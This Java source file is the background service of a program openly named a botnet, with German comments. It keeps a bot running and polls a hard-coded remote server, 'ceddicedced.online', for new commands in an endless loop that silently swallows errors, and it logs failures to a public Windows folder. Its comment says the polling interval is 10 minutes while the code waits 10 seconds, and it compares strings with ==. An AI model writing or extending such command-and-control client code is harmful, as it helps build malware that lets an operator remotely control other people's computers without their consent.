package Botnet;

import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;
import java.util.concurrent.TimeUnit;
/**
 * Diese Klasse stellt einen Hintergrund Service dar welcher den Bot aktiv im Hintergrund hält. Und auf neue Befehle prüft.
 * @author Cedric Busacker
 *
 */
public class Service {

	private static String server;

/**
 * Führt beim Start FirstConnect() aus und wartet denn jeweils 10 Minuten um einen Befehl vom Server abzufragen.
 * @param args
 */
	public static void main(String[] args) {
		
		try {
			Host localhost = new Host(true);
			if (args.length>0) {
				server = args[0];
				if (server=="localhost") {
					server = localhost.getIPv4();
				}
			}else {
				server = "ceddicedced.online";
			}
			Client client = new Client(server, localhost);
			try {
				client.FirstConnect();
			}catch (Exception e) {
				e.printStackTrace();
			}
			
			System.out.println("Starting Loop...");
			while (true) {
				System.out.println("Loop");
				Thread.sleep(TimeUnit.SECONDS.toMillis(10));
				try {client.GetUpdate();} catch (Exception e) {}
				
			}
			
		} catch (Exception e) {
			e.printStackTrace();
			LogErrors(e);
		}
		

	}

	/**
	 * Alle auftretenden Errors werden in einer LogDatei gespeichert.
	 * @param e
	 */
	private static void LogErrors(Exception e) {
		FileWriter LogWriter;
		try {
			LogWriter = new FileWriter("C:/Users/Public/errorService.log", true);
			StackTraceElement[] Error = e.getStackTrace();
			LogWriter.write("=== "+ new Date().toString() + " ===\n");
			LogWriter.write(e.toString()+ "\n");
			for (int i = 0; i < Error.length; i++) {
				LogWriter.write(Error[i].toString()+ "\n");
			}
			
			LogWriter.write("==============\n");
			LogWriter.flush();
			LogWriter.close();
			
		       
		} catch (IOException e1) {
		}
	}

}
